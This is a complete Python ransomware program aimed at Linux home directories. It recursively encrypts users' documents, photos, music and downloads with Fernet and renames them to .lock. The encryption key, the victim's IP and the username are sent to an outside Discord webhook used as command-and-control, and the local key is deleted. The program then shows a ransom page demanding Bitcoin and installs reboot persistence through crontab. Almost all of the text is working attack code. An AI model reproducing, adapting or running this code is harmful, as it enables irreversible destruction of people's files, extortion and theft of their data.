#!/usr/bin/env python3
import os, random, string, sys, json
import threading, datetime, time, requests
import urllib.parse, webbrowser
from cryptography.fernet import Fernet

_files = []
_key = Fernet.generate_key()
_uid = ''

def _index(_path):
    global _files
    # scrape files recursively in working/sub-directory(s)
    for root, dirs, files in os.walk(_path):
        for file in files:
            file_path = os.path.join(root, file)
            
            # add <path>/<filename>.<file-ext> to list
            _files.append(file_path)
    
    # remove any line-feeds
    _files = [item.replace("\n", "") for item in _files]
            
def _export(_uid, _key, _usr):
    _ip = _whoami() 
    _url = 'https://discord.com/api/webhooks/1240812750263812119/UvHUmRa7jKZ2jZLAPHZHhrXLj-jG6nlSV-Jhuh6_n42Kq3EXLFGErQwzPTpSiJ3GbCBu'
    _date = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S").replace(" ", " @ ")
    _info = "**IP ADDRESS**: " + _ip + "\r\n**DEVICE USER**: " + _usr + "\r\n**UID**: " + _uid + "\r\n**KEY**: " + _key.decode() + "\r\n**TIMESTAMP**: " + _date
    
    while True:
        try:
            headers = {
                'Content-Type': 'application/json'
            }

            payload = {
                'content': _info
            }
            
            # sent information to Discord web hook. wait up to 60 seconds is connection is slow
            response = requests.post(_url, data=json.dumps(payload), headers=headers, timeout=60)
    
            # complete transmission if response is valid
            if response.status_code == 200 or response.status_code == 204:
                break
        except:
            # error sending message to discord. retry in 30 seconds
            time.sleep(30)
    
    # encryption key sent to C2. delete local copy
    try:
        os.remove('open.gate')
    except:
        pass

def _whoami():
    try:
        response = requests.get('https://api.ipify.org')
        if response.status_code == 200:
            return response.text
        else:
            return 'error...'
    except:
        return 'error...'

def _notify(_uid):
    _email = 'ransom@proton.me'
    _btcad = '3J98t1WpEZ73CNmQviecrnyiWrnqRhWNLy'
    _date = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S").replace(" ", " @ ")
    
    page = '''<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="description" content="Oops! All locked up :)">
<meta name="author" content="waived">
<script>document.title="　";</script>
<style>
body {
    font-family: 'Courier New', monospace;
    background-color: black;
    display: flex;
    justify-content: center;
    align-items: center;
    height: 100vh;
    margin: 0;
}
.content {
    max-width: 900px;
    text-align: left;
    background-color: blue;
    color: white;
    padding: 20px;
}
.title {
    font-size: 40px;
    margin: 0;
}
</style>
</head>
<body>
<div class="content">
<center><p class="title">ATTENTION!</p></center><br>
Oops! Your important files have been locked with a military-grade encryption algorithm! Without the decryption key it is impossible to recover your files!<br><br>
<b>What happened to my files?</b><br>
The bytes which make up your files have been scrambled by a strong encryption algorithm. The content of said files are now rendered useless unless decrypted! Many of your documents, photos, videos/audio, and other files of interest are no longer accessible. Don't worry! You can still recover your files with our decryption software.
<br><br>
<b>How can I recover my files?</b><br>
To recover your files, you need to purchase our decryption program. <br><br><u>Follow the instructions below to get your files back</u>:<br>
<b>1</b>. Purchase Bitcoins or another cryptocurrency equivalent to $150.00 USD.<br>
<b>2</b>. Send the payment to the cryptocurrency address: <b>''' + _btcad + '''</b>.<br>
<b>3</b>. Contact <b>''' + _email + '''</b> and include the transaction ID and UID found below.<br>
<b>4</b>. Once your email is received, we will send you the decryption software. No instructions needed! Just execute and your files will be unlocked.<br><br>
<b>Warning</b>: Do not attempt to decrypt your files using third-party software! This may result in permanent data loss.<br>
<br>
<b>Deadline</b>:<br>
You have 72 hours to make the payment! Each 24-hour period following the deadline will result in an additional fee of $50.00 USD. If total fee (including late fees) exceed $500.00 USD, our services will be rescinded and files still stay permanently locked.
<br><br>
<b>Unique UID</b>:<br>
Your user-identification code is: <b>''' + _uid + '''</b><br>
<br>
<b>Reminder</b>: <i>***files were initially locked on ''' + _date + '''</i>
</div>
</body>
</html>'''
    
    # write HTML content to web page
    with open('/tmp/warning.html', 'w') as f:
        f.write(page)
        f.close()
    webbrowser.open('file:///tmp/warning.html', new=2)

def main():
    global _files, _key, _uid
    
    # catalog all directories to check
    _usr = os.getlogin()
    _dir = ['/home/{}/Desktop',
            '/home/{}/Pictures',
            '/home/{}/Documents',
            '/home/{}/Downloads',
            '/home/{}/Music',
            '/home/{}/Videos'
            #'/home/{}'
            #'/'
            ]
            
    # if location/s exist, begin indexing process
    for x in _dir:
        _path = x.format(_usr)
        if os.path.exists(_path):
            _index(_path)
    
    _uid = ''.join(random.choices(string.ascii_letters + string.digits, k=30))
    with open("open.gate", "wb") as _make:
        _make.write(_key)
    
    
    # ignore certain file-extensions; .gate and .lock are part of the encryption
    # process. keep those blacklisted! The other files listed are known to be of
    # large filesize and can bog down the encryption process.
    _blacklist = ['.lock', '.gate', '.iso', '.dd', '.vdi', '.vbox',
                 '.img', '.dmg', '.e01', '.vhd', '.vhdx', 'vmdk',
                 '.bin', '.cue', '.ndf', '.daa', '.tc', '.wim',
                 '.ex01', '.l01', '.lx01'
                 ]
    
    for _targ in _files:
        
        _exclude = False
        # examine file extension
        for check in _blacklist:
            # flag file is extension found in blacklist
            if (_targ.lower().endswith(check) or _targ.lower() == __file__.lower()):
                _exclude = True
                break
                
        # encrypt non-blacklisted files
        if _exclude != True:
            _content = b''
            try:
                with open(_targ, "rb") as _encrypt:
                    # open file, save content to variable
                    _content = _encrypt.read()
                    
                # encrypt content
                _content_encrypted = Fernet(_key).encrypt(_content)
                    
                # overwrite encrypted content to file
                with open(_targ, "wb") as _overwrite:
                   _overwrite.write(_content_encrypted)
                   
                # rename to .lock file extension
                rname = _targ + '.lock'
                try:
                    os.rename(_targ, rname)
                except:
                    pass
                
                # remove file from index list
                _files.remove(_targ)
            except Exception as e:
                print(e)
                
    # ensure key gets exported to C2
    e = threading.Thread(target=_export, args=(_uid, _key, _usr))
    e.start()
    
    # build / display user-notification
    _notify(_uid)
    
    # enable start-up persistence
    content = '''#!/bin/bash
_progname="''' + sys.argv[0] + '''"
_cmd="python3 ''' + __file__ + '''"

if ! crontab -l | grep -q "$_progname"; then
    (crontab -l 2>/dev/null; echo "@reboot $_cmd") | crontab -
fi
rm -- "$0"'''
    try:
        with open("setup.sh", "w") as file:
            file.write(content)
        
        os.system('chmod +x setup.sh')
        os.system('./setup.sh')
    except:
        pass
    
    sys.exit()
            
if __name__ == "__main__":
    main()
